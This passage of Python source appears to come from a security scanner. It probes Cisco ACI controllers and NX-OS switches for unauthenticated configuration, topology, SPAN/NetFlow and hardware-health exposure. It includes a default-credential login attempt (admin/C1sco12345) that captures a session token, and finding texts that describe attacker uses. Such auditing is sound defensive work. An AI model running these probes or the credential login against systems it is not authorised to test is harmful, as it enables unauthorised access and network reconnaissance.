                    + (f" (+ {len(user_details) - 15} more)" if len(user_details) > 15 else "")
                    + ". Hashed passwords are offline-crackable; plaintext 'admin' account "
                    "enables targeted brute-force with known default C1sco12345."
                ),
                "host": host,
                "port": port,
            })

    # --- default credentials: admin / C1sco12345 ------------------------------
    # ACI initial setup dialog sets the admin password during commissioning (Ch. 3
    # Example 3-1).  Lab and staged fabrics frequently retain the vendor default.
    login_payload = json.dumps({
        "aaaUser": {"attributes": {"name": "admin", "pwd": "C1sco12345"}}
    }).encode()
    status, body = _post("/api/aaaLogin.json", login_payload)
    if status == 200 and body and b"aaaLogin" in body:
        # Extract token from response if present
        token = ""
        try:
            data = json.loads(body.decode("utf-8", errors="replace"))
            imdata = data.get("imdata", [])
            if imdata:
                token = imdata[0].get("aaaLogin", {}).get("attributes", {}).get("token", "")
        except (ValueError, KeyError, IndexError):
            pass
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_DEFAULT_CREDS",
            "detail": (
                f"POST /api/aaaLogin.json with admin/C1sco12345 returned HTTP 200 on "
                f"{host}:{port}; default APIC credentials accepted. "
                + (f"Session token obtained: {token[:40]}..." if token else "")
                + " Default credentials grant full fabric-admin access to the APIC REST "
                "API, enabling complete ACI policy modification including EPG/contract "
                "changes, L3Out reconfig, and VMM domain manipulation."
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_aci_fabric_access_policies(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco ACI fabric access policy and VLAN pool exposure.

    ACI fabric access policies govern the physical network attachment layer:
    VLAN pools define the encapsulation ranges allocated to EPGs; Attachable
    Entity Profiles (AEPs) bind VLAN pools to physical interface profiles;
    interface profiles (infraAccPortP) select which ports participate in a
    given policy group; LLDP and CDP per-port policies control topology
    advertisement on each interface.

    When an APIC serves these /api/node/class/* endpoints unauthenticated the
    attacker obtains:
    - VLAN encapsulation ranges (fvnsEncapBlk from/to): full VLAN map usable for
      VLAN-hopping and unauthorized EPG membership
    - AEP names and attached domain bindings: reveals which physical ports share
      what policies
    - LLDP/CDP per-port policy state: identifies ports where topology discovery
      protocols broadcast adjacency information, widening the lateral-movement
      attack surface described in Ch. 3's fabric setup guidance
    - FEX profiles (infraFexP): Nexus 2000 Fabric Extender attachment points

    Source: Deploying ACI: The Complete Guide, Ch. 3 "Bringing Up a Fabric"
    (management network configuration, OOB/in-band trade-offs, LLDP fabric
    discovery mechanism), Ch. 2 "Building a Fabric" (access policy objects,
    VLAN pools, AEP design, FEX considerations).

    Args:
        host: Target IP or hostname of the APIC.
        port: HTTPS port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f"https://{host}:{port}"
    _headers = {
        "Accept": "application/json",
        "User-Agent": "ablation/1.0",
    }

    def _get(path: str) -> tuple:
        """Return (status, body_bytes) or (None, b'') on network error."""
        req = urllib.request.Request(base + path, headers=_headers)
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(131072)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except (urllib.error.URLError, OSError):
            return None, b""

    def _parse_attrs(body: bytes) -> list:
        """Extract list of 'attributes' dicts from APIC imdata JSON response."""
        try:
            data = json.loads(body.decode("utf-8", errors="replace"))
            return [
                obj[list(obj.keys())[0]].get("attributes", {})
                for obj in data.get("imdata", [])
                if obj and list(obj.keys())
            ]
        except (ValueError, KeyError, IndexError, AttributeError):
            return []

    # --- fvnsVlanInstP: VLAN pool instances -----------------------------------
    # VLAN pools define the encapsulation ranges reserved for ACI EPG bindings.
    # Each pool has a name, allocMode (static/dynamic), and one or more encapBlk
    # children with from/to VLAN encapsulations.  Disclosure enables VLAN hopping
    # into EPGs by spoofing encapsulation tags from known-valid ranges.
    status, body = _get("/api/node/class/fvnsVlanInstP.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        count = len(attrs_list)
        pool_names = [a.get("name", "") for a in attrs_list if a.get("name")]
        findings.append({
            "severity": "CRITICAL",
            "title": "ACI_VLAN_POOLS_UNAUTH",
            "detail": (
                f"GET /api/node/class/fvnsVlanInstP.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {count} VLAN pool(s) exposed ({len(body)} bytes). "
                f"Pools: {', '.join(pool_names[:10]) or 'n/a'}. VLAN pools define the "
                "encapsulation namespaces for ACI EPGs; their enumeration enables "
                "targeted VLAN-tag injection into known-valid encapsulation ranges."
            ),
            "host": host,
            "port": port,
        })
        # Fetch encap block ranges from each pool via the full object subtree
        # fvnsEncapBlk is a child of fvnsVlanInstP; query class endpoint directly
        status2, body2 = _get("/api/node/class/fvnsEncapBlk.json")
        if status2 == 200 and body2:
            encap_attrs = _parse_attrs(body2)
            ranges = []
            for a in encap_attrs:
                frm = a.get("from", "")
                to = a.get("to", "")
                if frm and to:
                    ranges.append(f"{frm}-{to}")
            if ranges:
                findings.append({
                    "severity": "HIGH",
                    "title": "ACI_VLAN_RANGES_DISCLOSED",
                    "detail": (
                        f"ACI VLAN encapsulation block ranges from fvnsEncapBlk on "
                        f"{host}:{port}: "
                        + ", ".join(ranges[:20])
                        + (f" (+ {len(ranges) - 20} more)" if len(ranges) > 20 else "")
                        + ". Knowing exact VLAN ranges allows crafting 802.1Q-tagged "
                        "frames that land in active EPG encapsulation spaces, bypassing "
                        "ACI whitelist policy by impersonating valid fabric encapsulations."
                    ),
                    "host": host,
                    "port": port,
                })

    # --- infraAttEntityP: Attachable Entity Profiles (AEP) --------------------
    # AEPs link VLAN pools to physical interface policies; they are the binding
    # point between the logical policy (VLAN pools, domains) and physical ports.
    status, body = _get("/api/node/class/infraAttEntityP.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        aep_names = [a.get("name", "") for a in attrs_list if a.get("name")]
        findings.append({
            "severity": "HIGH",
            "title": "ACI_AEP_POLICIES_UNAUTH",
            "detail": (
                f"GET /api/node/class/infraAttEntityP.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} AEP(s) exposed ({len(body)} bytes). "
                f"AEPs: {', '.join(aep_names[:10]) or 'n/a'}. Attachable Entity Profiles "
                "bind VLAN pools to interface profiles; their enumeration maps which "
                "physical ports carry which VLAN encapsulation policies."
            ),
            "host": host,
            "port": port,
        })

    # --- infraAccPortP: interface profiles ------------------------------------
    status, body = _get("/api/node/class/infraAccPortP.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        intf_names = [a.get("name", "") for a in attrs_list if a.get("name")]
        findings.append({
            "severity": "HIGH",
            "title": "ACI_INTF_PROFILES_UNAUTH",
            "detail": (
                f"GET /api/node/class/infraAccPortP.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} interface profile(s) exposed "
                f"({len(body)} bytes). Profiles: {', '.join(intf_names[:10]) or 'n/a'}. "
                "Interface profiles map switch port selectors to policy groups; "
                "enumeration reveals the physical port assignment scheme across the fabric."
            ),
            "host": host,
            "port": port,
        })

    # --- infraHPortS: port selectors ------------------------------------------
    status, body = _get("/api/node/class/infraHPortS.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        findings.append({
            "severity": "MEDIUM",
            "title": "ACI_PORT_SELECTORS_UNAUTH",
            "detail": (
                f"GET /api/node/class/infraHPortS.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} port selector(s) exposed "
                f"({len(body)} bytes). Port selectors define which specific port ranges "
                "within an interface profile carry a given access policy group; their "
                "enumeration completes the physical-to-policy mapping for the fabric."
            ),
            "host": host,
            "port": port,
        })

    # --- fabricHIfPol: fabric interface policies (speed/duplex) ---------------
    status, body = _get("/api/node/class/fabricHIfPol.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        findings.append({
            "severity": "MEDIUM",
            "title": "ACI_INTF_POLICIES_UNAUTH",
            "detail": (
                f"GET /api/node/class/fabricHIfPol.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} interface policy object(s) exposed "
                f"({len(body)} bytes). Fabric interface policies encode per-port speed, "
                "duplex, auto-negotiation, and link-debounce settings — operational detail "
                "useful for physical-layer denial-of-service via mismatched policy injection."
            ),
            "host": host,
            "port": port,
        })

    # --- lldpIfPol: LLDP per-port policy --------------------------------------
    # LLDP is the fabric discovery mechanism used by the APIC to automatically
    # discover leaf and spine nodes during initial fabric bring-up (Ch. 3).  LLDP
    # is enabled by default on fabric-facing ports; disabling it on access ports
    # is a hardening recommendation.  Knowing which ports have LLDP enabled is
    # a topology-disclosure attack surface (adjacent device enumeration).
    status, body = _get("/api/node/class/lldpIfPol.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        findings.append({
            "severity": "HIGH",
            "title": "ACI_LLDP_POLICY_UNAUTH",
            "detail": (
                f"GET /api/node/class/lldpIfPol.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} LLDP interface policy object(s) "
                f"exposed ({len(body)} bytes). LLDP is the mechanism ACI uses for "
                "automatic fabric node discovery during initial bring-up (Ch. 3); "
                "per-port LLDP policy disclosure reveals which access ports advertise "
                "topology information to connected endpoints."
            ),
            "host": host,
            "port": port,
        })
        # Parse for LLDP-enabled ports (adminRxSt=enabled / adminTxSt=enabled)
        lldp_enabled = []
        for a in attrs_list:
            name = a.get("name", "")
            rx = a.get("adminRxSt", "")
            tx = a.get("adminTxSt", "")
            if rx == "enabled" or tx == "enabled":
                lldp_enabled.append(f"{name}(rx={rx},tx={tx})")
        if lldp_enabled:
            findings.append({
                "severity": "HIGH",
                "title": "ACI_LLDP_ENABLED_PORTS",
                "detail": (
                    f"LLDP-enabled port policies on {host}:{port}: "
                    + ", ".join(lldp_enabled[:15])
                    + (f" (+ {len(lldp_enabled) - 15} more)" if len(lldp_enabled) > 15 else "")
                    + ". Ports with LLDP transmit enabled broadcast device identity and "
                    "capability TLVs to directly connected hosts, enabling passive topology "
                    "mapping from any access-layer endpoint attached to these port groups."
                ),
                "host": host,
                "port": port,
            })

    # --- cdpIfPol: CDP per-port policy ----------------------------------------
    # CDP disclosure surface mirrors LLDP; Cisco-proprietary discovery protocol
    # that broadcasts chassis ID, platform, capabilities, and management addresses.
    status, body = _get("/api/node/class/cdpIfPol.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        cdp_enabled = []
        for a in attrs_list:
            name = a.get("name", "")
            admin_st = a.get("adminSt", "")
            if admin_st == "enabled":
                cdp_enabled.append(name)
        findings.append({
            "severity": "HIGH",
            "title": "ACI_CDP_POLICY_UNAUTH",
            "detail": (
                f"GET /api/node/class/cdpIfPol.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} CDP interface policy object(s) "
                f"exposed ({len(body)} bytes). "
                + (f"CDP-enabled policies: {', '.join(cdp_enabled[:10])}. " if cdp_enabled else "")
                + "CDP broadcasts platform model, IOS/NX-OS version, and management IP "
                "to adjacent devices — attacker on an access port receives complete "
                "Cisco device inventory for the directly attached fabric switch."
            ),
            "host": host,
            "port": port,
        })

    # --- infraFexP: FEX profiles ----------------------------------------------
    # Nexus 2000 Fabric Extenders attach to leaf switches as remote line cards;
    # FEX profiles in ACI define which leaf ports host FEX connections and which
    # downstream server ports each FEX exposes.  Ch. 2 notes that heavy FEX use
    # on a single leaf strains per-leaf scalability limits.
    status, body = _get("/api/node/class/infraFexP.json")
    if status == 200 and body:
        attrs_list = _parse_attrs(body)
        fex_names = [a.get("name", "") for a in attrs_list if a.get("name")]
        findings.append({
            "severity": "HIGH",
            "title": "ACI_FEX_PROFILES_UNAUTH",
            "detail": (
                f"GET /api/node/class/infraFexP.json returned HTTP 200 unauthenticated "
                f"on {host}:{port}; {len(attrs_list)} FEX profile(s) exposed "
                f"({len(body)} bytes). FEX profiles: {', '.join(fex_names[:10]) or 'n/a'}. "
                "Fabric Extender profiles reveal Nexus 2000 attachment topology on leaf "
                "switches; FEX IDs map to physical server access layer chassis enabling "
                "targeted disruption of downstream host connectivity."
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_nxos_span_erspan_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco NX-OS SPAN/ERSPAN session configuration exposure via NX-API.

    SPAN (Switched Port Analyzer) copies network traffic to a local monitor port.
    ERSPAN (Encapsulated Remote SPAN) wraps spanned traffic in GRE and forwards it
    across an IP network to a remote analyser.  Both are documented in
    'Troubleshooting Cisco Nexus Switches and NX-OS', Ch. 2 (Traffic Analysis).

    Unauthenticated NX-API access to SPAN/ERSPAN configuration reveals monitored
    interfaces, destination ports, remote collector IPs, and NetFlow exporter targets
    -- any of which constitutes an alternate traffic exfiltration path or can be
    hijacked to redirect mirrored production traffic to an attacker-controlled endpoint.

    Args:
        host: Target IP or hostname.
        port: HTTPS port (default 443); HTTP on port 80 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []

    def _nxapi_post(scheme: str, p: int, cmd: str) -> tuple:
        """POST NX-API CLI command; return (http_status, body_str) or (None, '')."""
        url = f"{scheme}://{host}:{p}/ins"
        payload = json.dumps({
            "ins_api": {
                "version": "1.0",
                "type": "cli_show",
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }).encode()
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(131072).decode("utf-8", errors="replace")
            try:
                rdict = json.loads(raw)
                out = rdict.get("ins_api", {}).get("outputs", {}).get("output", {})
                if isinstance(out, list):
                    out = out[0] if out else {}
                body = out.get("body", "")
                if isinstance(body, dict):
                    body = json.dumps(body)
                return resp.status, str(body) if body else raw[:512]
            except (ValueError, KeyError, AttributeError):
                return resp.status, raw[:512]
        except urllib.error.HTTPError as exc:
            return exc.code, ""
        except (urllib.error.URLError, OSError):
            return None, ""

    def _rest_get(scheme: str, p: int, path: str) -> tuple:
        """GET NX-API REST endpoint; return (http_status, body_bytes) or (None, b'')."""
        url = f"{scheme}://{host}:{p}{path}"
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(65536)
        except (urllib.error.URLError, urllib.error.HTTPError, OSError):
            return None, b""

    for scheme, p in [("https", port), ("http", 80)]:
        # --- show monitor session all: full SPAN session list ------------------
        # Ch. 2: 'show monitor session' output includes session type, state,
        # source interfaces (rx/tx/both), and destination port.
        status, body = _nxapi_post(scheme, p, "show monitor session all")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_SPAN_SESSIONS_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show monitor session all' returned HTTP 200 "
                    f"unauthenticated on {scheme}://{host}:{p}; full SPAN session table "
                    f"exposed ({len(body)} bytes). SPAN session config discloses monitored "
                    "interfaces and local destination ports -- an attacker with write access "
                    "can redirect spanned traffic to an attacker-controlled monitoring port."
                ),
                "host": host,
                "port": p,
            })
            # Parse source and destination interface references
            src_intf = re.findall(r"\b(Eth(?:ernet)?\d+/\d+\S*|Po\d+\S*)\b", body)
            dst_intf = re.findall(
                r"(?i)destination\s+ports?\s*[:\s]+(\S+)", body
            )
            if src_intf or dst_intf:
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_SPAN_TOPOLOGY_DISCLOSED",
                    "detail": (
                        f"SPAN session topology disclosed unauthenticated on "
                        f"{scheme}://{host}:{p}: "
                        f"source interfaces: {', '.join(src_intf[:8]) or 'n/a'}; "
                        f"destination interfaces: {', '.join(dst_intf[:8]) or 'n/a'}. "
                        "Full interface mirroring topology reveals traffic copy targets "
                        "and enables reconstruction of the physical monitoring architecture."
                    ),
                    "host": host,
                    "port": p,
                })
            # Parse ERSPAN destination IPs embedded in session output
            erspan_ips = re.findall(
                r"(?i)(?:dst[- ]ip|destination[- ]ip|ip[- ]address)\s+"
                r"((?:\d{1,3}\.){3}\d{1,3})",
                body,
            )
            if erspan_ips:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_ERSPAN_DESTINATION_IP",
                    "detail": (
                        f"ERSPAN destination IP(s) disclosed unauthenticated on "
                        f"{scheme}://{host}:{p}: {', '.join(erspan_ips[:5])}. "
                        "Per Ch. 2, ERSPAN destination IPs are the remote collector "
                        "addresses receiving GRE-encapsulated copies of switch traffic; "
                        "disclosure identifies traffic analysis infrastructure and enables "
                        "GRE injection attacks toward those collector endpoints."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- NX-API REST: SPAN MO tree (DME) -----------------------------------
        # NX-OS DME exposes SPAN configuration as a managed object tree under
        # sys/span; each SPAN session is a child object with src/dst bindings.
        status, body_bytes = _rest_get(scheme, p, "/api/mo/sys/span.json")
        if status == 200 and body_bytes and len(body_bytes) > 10:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_SPAN_MO_UNAUTH",
                "detail": (
                    f"GET /api/mo/sys/span.json returned HTTP 200 unauthenticated on "
                    f"{scheme}://{host}:{p}; NX-OS SPAN Managed Object tree exposed "
                    f"({len(body_bytes)} bytes). The DME SPAN subtree encodes all session "
                    "definitions, source/destination bindings, filter ACLs, and ERSPAN "
                    "parameters in a structured object model accessible without credentials."
                ),
                "host": host,
                "port": p,
            })

        # --- show monitor session erspan-id all: ERSPAN-specific sessions ------
        # Ch. 2 Example 2-5: 'show monitor session' on ERSPAN sessions lists
        # erspan-id, source switch, GRE destination IP, and session state.
        status, body = _nxapi_post(scheme, p, "show monitor session erspan-id all")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_ERSPAN_SESSIONS_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show monitor session erspan-id all' returned "
                    f"HTTP 200 unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                    "ERSPAN session enumeration discloses ERSPAN IDs, source switches, "
                    "and remote collector endpoints -- per Ch. 2, ERSPAN routes "
                    "GRE-encapsulated traffic copies across IP networks to centralised "
                    "analysers, making destination IPs high-value lateral-movement targets."
                ),
                "host": host,
                "port": p,
            })

        # --- show interface brief: filter for Analyzer-mode interfaces ---------
        # NX-OS interfaces configured as SPAN destinations are placed in monitoring
        # (switchport monitor) state; 'show interface brief' lists their type/status.
        status, body = _nxapi_post(scheme, p, "show interface brief")
        if status == 200 and len(body) > 10:
            analyzer_intf = re.findall(
                r"(?i)((?:Eth|eth)\d+/\d+\S*|Po\d+\S*)[^\n]*(?:monitor|analyzer|span)",
                body,
            )
            if analyzer_intf:
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_ANALYZER_INTF",
                    "detail": (
                        f"Ethernet Analyzer (SPAN destination) interfaces found "
                        f"unauthenticated on {scheme}://{host}:{p}: "
                        f"{', '.join(analyzer_intf[:8])}. Interfaces in monitor/analyzer "
                        "mode receive full traffic copies of spanned sessions -- "
                        "identifying these ports enables physical-access interception "
                        "of mirrored production traffic from the monitoring port."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show running-config | include erspan: inline ERSPAN config lines --
        # Pipe-filtered running-config extracts all ERSPAN-related statements
        # including 'monitor session N type erspan-source', 'erspan-id', and
        # 'ip destination' lines from a single NX-API call.
        status, body = _nxapi_post(
            scheme, p, "show running-config | include erspan"
        )
        if status == 200 and len(body) > 5:
            erspan_lines = [l.strip() for l in body.splitlines() if l.strip()]
            if erspan_lines:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_ERSPAN_CONFIG_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show running-config | include erspan' returned "
                        f"HTTP 200 unauthenticated on {scheme}://{host}:{p}; "
                        f"{len(erspan_lines)} ERSPAN config line(s) disclosed: "
                        + "; ".join(erspan_lines[:5])
                        + (f" (+ {len(erspan_lines) - 5} more)" if len(erspan_lines) > 5 else "")
                        + ". Running-config ERSPAN lines expose destination IPs, ERSPAN IDs, "
                        "origin addresses, and session types in exact deployable form."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show run netflow: NetFlow exporter config and collector IPs -------
        # Ch. 2 NetFlow section: 'flow exporter' objects define destination IP,
        # UDP port, source interface, and VRF for flow export.  Collector IPs are
        # the remote UDP endpoints receiving traffic metadata streams.
        status, body = _nxapi_post(scheme, p, "show run netflow")
        if status == 200 and len(body) > 5:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_NETFLOW_COLLECTORS_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show run netflow' returned HTTP 200 unauthenticated "
                    f"on {scheme}://{host}:{p} ({len(body)} bytes). NetFlow configuration "
                    "disclosed -- per Ch. 2, this includes flow records, exporters, monitors, "
                    "and applied interfaces.  Flow exporter definitions reveal remote UDP "
                    "collector addresses receiving traffic metadata."
                ),
                "host": host,
                "port": p,
            })
            # Extract collector destination IPs from 'destination <IP>' stanzas
            collector_ips = re.findall(
                r"(?i)^\s*destination\s+((?:\d{1,3}\.){3}\d{1,3})",
                body,
                re.MULTILINE,
            )
            if collector_ips:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_NETFLOW_COLLECTOR_IPS",
                    "detail": (
                        f"NetFlow collector IP(s) disclosed unauthenticated on "
                        f"{scheme}://{host}:{p}: {', '.join(collector_ips[:8])}. "
                        "Collector IPs are the UDP endpoints receiving flow export data; "
                        "disclosure identifies traffic analysis infrastructure and enables "
                        "spoofed NetFlow injection toward a known collector IP and port."
                    ),
                    "host": host,
                    "port": p,
                })

    # --- UDP 4789: VXLAN/ERSPAN transport port probe ---------------------------
    # ERSPAN uses GRE (IP proto 47) for encapsulation; some NX-OS builds also
    # accept VXLAN (UDP 4789) as an alternate ERSPAN transport.  Send a minimal
    # valid VXLAN probe.  ConnectionRefusedError = ICMP port unreachable = closed.
    # socket.timeout = no ICMP response = port open or filtered.
    sock = None
    vxlan_open = False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(min(timeout, 3.0))
        # VXLAN header (RFC 7348): I-flag=1, reserved x3, VNI=1, reserved
        vxlan_probe = struct.pack("!BBBBBBBB", 0x08, 0, 0, 0, 0, 0, 1, 0)
        sock.sendto(vxlan_probe, (host, 4789))
        try:
            sock.recv(256)
            vxlan_open = True
        except socket.timeout:
            vxlan_open = True   # no ICMP port-unreachable -> open or filtered
        except OSError:
            vxlan_open = False
    except (OSError, socket.error):
        vxlan_open = False
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass

    if vxlan_open:
        findings.append({
            "severity": "HIGH",
            "title": "NXOS_ERSPAN_TRANSPORT_PORT",
            "detail": (
                f"UDP 4789 (VXLAN/ERSPAN transport) did not return ICMP port-unreachable "
                f"on {host}:4789 -- port is open or filtered.  ERSPAN on NX-OS uses GRE "
                "(IP proto 47) but VXLAN UDP 4789 is an alternate transport in some builds; "
                "an open VXLAN port may indicate active ERSPAN traffic copying reachable "
                "from this network position without authentication."
            ),
            "host": host,
            "port": 4789,
        })

    return findings


def probe_nxos_hardware_diagnostic_surface(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco NX-OS hardware diagnostic and health check exposure via NX-API.

    NX-OS ships the Generic Online Diagnostic (GOLD) framework, environment sensors,
    hardware inventory (FRU serial numbers), and core-file management -- all queryable
    via NX-API CLI POST to /ins.  Unauthenticated access discloses hardware serial
    numbers, firmware versions, crash records, and live failure status, enabling
    precise hardware targeting and supply-chain attribution.

    Source: 'Troubleshooting Cisco Nexus Switches and NX-OS', Ch. 3 (Nexus Hardware
    Troubleshooting): GOLD diagnostics (bootup/runtime/on-demand), health checks,
    core file analysis, module inventory, environmental monitoring.

    Args:
        host: Target IP or hostname.
        port: HTTPS port (default 443); HTTP on port 80 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []

    def _nxapi_post(scheme: str, p: int, cmd: str) -> tuple:
        """POST NX-API CLI command; return (http_status, body_str) or (None, '')."""
        url = f"{scheme}://{host}:{p}/ins"
        payload = json.dumps({
            "ins_api": {
                "version": "1.0",
                "type": "cli_show",
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }).encode()
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(131072).decode("utf-8", errors="replace")
            try:
                rdict = json.loads(raw)
                out = rdict.get("ins_api", {}).get("outputs", {}).get("output", {})
                if isinstance(out, list):
                    out = out[0] if out else {}
                body = out.get("body", "")
                if isinstance(body, dict):
                    body = json.dumps(body)
                return resp.status, str(body) if body else raw[:512]
            except (ValueError, KeyError, AttributeError):
                return resp.status, raw[:512]
        except urllib.error.HTTPError as exc:
            return exc.code, ""
        except (urllib.error.URLError, OSError):
            return None, ""

    for scheme, p in [("https", port), ("http", 80)]:
        # --- show system health: overall health status -------------------------
        # Ch. 3 health checks section: regular health checks verify module state,
        # crashes, packet drops, and interface errors.
        status, body = _nxapi_post(scheme, p, "show system health")
        if status == 200 and len(body) > 5:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_SYSTEM_HEALTH_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show system health' returned HTTP 200 unauthenticated "
                    f"on {scheme}://{host}:{p} ({len(body)} bytes). System health summary "
                    "exposed without credentials -- attacker obtains a live fault inventory "
                    "of all system components, enabling prioritised targeting of degraded "
                    "hardware for denial-of-service or stability disruption."
                ),
                "host": host,
                "port": p,
            })
            # Parse lines containing failure/error indicators
            fail_lines = [
                l.strip() for l in body.splitlines()
                if re.search(r"(?i)\b(?:fail|error|degraded|critical)\b", l)
                and l.strip()
            ]
            if fail_lines:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_HEALTH_FAILURES_DISCLOSED",
                    "detail": (
                        f"Active system health failures disclosed unauthenticated on "
                        f"{scheme}://{host}:{p}: {len(fail_lines)} failure indicator(s). "
                        f"Sample: {'; '.join(l[:60] for l in fail_lines[:3])}. "
                        "Failed component disclosure enables an attacker to time attacks "
                        "against already-degraded hardware for maximum operational impact."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show diagnostic result module all: GOLD test results --------------
        # Ch. 3 Example 3-3: 'show diagnostic result module' lists per-module
        # test outcomes where '.' = pass, 'F' = fail, 'E' = error.
        status, body = _nxapi_post(scheme, p, "show diagnostic result module all")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_DIAG_RESULTS_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show diagnostic result module all' returned HTTP 200 "
                    f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                    "GOLD (Generic Online Diagnostic) results for all modules exposed -- "
                    "per Ch. 3, tests cover PortLoopback, StandbyFabricLoopback, "
                    "ExternalCompactFlash, and memory health across SUP and line cards."
                ),
                "host": host,
                "port": p,
            })
            # Parse for FAIL or Error result markers
            diag_fail_lines = [
                l.strip() for l in body.splitlines()
                if re.search(r"(?i)\b(?:fail|error)\b", l) and l.strip()
            ]
            if diag_fail_lines:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_DIAG_FAILURES_DISCLOSED",
                    "detail": (
                        f"GOLD diagnostic test failures disclosed unauthenticated on "
                        f"{scheme}://{host}:{p}: {len(diag_fail_lines)} failure line(s). "
                        f"Sample: {'; '.join(l[:60] for l in diag_fail_lines[:3])}. "
                        "Failed GOLD tests identify specific hardware faults -- disclosure "
                        "enables targeted exploitation of degraded line cards or supervisors."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show environment power: power supply status -----------------------
        # Ch. 3 'show hardware' covers power supply and fan status in the chassis.
        status, body = _nxapi_post(scheme, p, "show environment power")
        if status == 200 and len(body) > 5:
            findings.append({
                "severity": "MEDIUM",
                "title": "NXOS_POWER_STATUS_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show environment power' returned HTTP 200 "
                    f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                    "Power supply status exposed -- input/output wattage, redundancy "
                    "state, and PS model identifiers readable without credentials. "
                    "Power supply model disclosure aids physical supply-chain attacks "
                    "and identifies single-point-of-failure power configurations."
                ),
                "host": host,
                "port": p,
            })

        # --- show environment fan: fan tray status -----------------------------
        status, body = _nxapi_post(scheme, p, "show environment fan")
        if status == 200 and len(body) > 5:
            findings.append({
                "severity": "MEDIUM",
                "title": "NXOS_FAN_STATUS_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show environment fan' returned HTTP 200 "
                    f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                    "Fan tray status exposed -- fan speed percentages, operational state, "
                    "and airflow direction readable without credentials. Fan failure "
                    "indicators disclose thermal management weaknesses exploitable for "
                    "hardware damage via sustained high-traffic thermal stress."
                ),
                "host": host,
                "port": p,
            })

